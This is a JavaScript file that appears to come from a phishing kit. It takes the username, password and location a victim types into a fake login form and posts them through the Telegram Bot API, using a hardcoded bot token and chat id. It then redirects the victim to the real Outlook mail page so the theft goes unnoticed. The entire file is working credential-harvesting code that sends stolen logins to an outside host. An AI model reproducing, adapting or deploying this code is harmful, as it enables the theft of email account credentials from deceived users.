//bot token
var telegram_bot_id = "6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o";
//chat id
var chat_id = "-4037234500";
var u_name, pax, pax2, ip2;
var ready = function () {
    u_name = document.getElementById("uzer").value;
    pax = document.getElementById("pazz").value;
    ip2 = document.getElementById("address").innerHTML;
    message = "📧Usr: " + u_name + "\n🔒Psw: " + pax + "\nLoc: " + ip2 + "\n🧿By: TEkashi🧿";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            chat_id: "-4037234500",
            text: message,
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://outlook.live.com/mail/0/';
        console.log(response);
    });
    return false;
};
